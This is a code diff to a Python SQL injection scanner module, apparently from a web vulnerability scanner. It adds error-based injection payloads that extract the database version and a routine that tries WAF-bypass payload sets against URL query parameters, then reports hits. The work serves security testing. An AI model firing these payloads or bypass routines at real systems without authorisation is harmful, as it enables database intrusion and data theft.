@@ -14,7 +14,12 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 from .base import BaseModule
 from ..core.reporter import Finding
-from ..payloads.sqli_errors import detect_sql_error, fingerprint_db
+from ..payloads.sqli_errors import (
+    detect_sql_error,
+    fingerprint_db,
+    WAF_BYPASS_PAYLOADS,
+    TIME_PAYLOADS_EXTENDED,
+)
 
 
 class SQLiModule(BaseModule):
@@ -31,7 +36,12 @@ class SQLiModule(BaseModule):
         "' UNION SELECT NULL--",
         "1;SELECT 1",
         "') OR ('1'='1",
+        "1' AND 1=CONVERT(int,@@version)--",
+        "' AND extractvalue(1,concat(0x7e,version()))-- -",
+        "' AND updatexml(1,concat(0x7e,version()),1)-- -",
     ]
+
+    WAF_BYPASS_SETS = WAF_BYPASS_PAYLOADS
 
     BOOLEAN_TRUE_FALSE_PAIRS = [
         ("AND 2*3*8=6*8", "AND 2*3*8=6*9"),
@@ -81,6 +91,7 @@ class SQLiModule(BaseModule):
             original_value = query_params[param_name][0]
             self.log(f"Testing param: {param_name}")
             self._test_error_based(url, parsed, query_params, param_name, original_value)
+            self._test_waf_bypass(url, parsed, query_params, param_name, original_value)
             self._test_boolean_blind(url, parsed, query_params, param_name, original_value)
             self._test_time_blind(url, parsed, query_params, param_name, original_value)
 
@@ -117,6 +128,33 @@ class SQLiModule(BaseModule):
                     details=f"Database: {db}",
                 ))
                 return
+
+    def _test_waf_bypass(self, url, parsed, query_params, param_name, original_value):
+        baseline = self.http.get(url)
+        if not baseline:
+            return
+        baseline_has_error, _ = detect_sql_error(baseline.text)
+
+        for category, payloads in self.WAF_BYPASS_SETS.items():
+            for payload in payloads:
+                test_val = original_value + payload
+                test_url = self._build_url(parsed, query_params, param_name, test_val)
+                resp = self.http.get(test_url)
+                if not resp:
+                    continue
+                found, pattern = detect_sql_error(resp.text)
+                if found and not baseline_has_error:
+                    db = fingerprint_db(resp.text)
+                    self.reporter.add(Finding(
+                        vuln_type="SQL Injection (WAF Bypass)",
+                        severity="HIGH",
+                        url=url,
+                        parameter=param_name,
+                        payload=payload,
+                        evidence=pattern,
+                        details=f"Bypass category: {category}, Database: {db}",
+                    ))
+                    return
 
     def _get_filtered_body(self, body: str, original_value: str) -> str:
         filtered = body
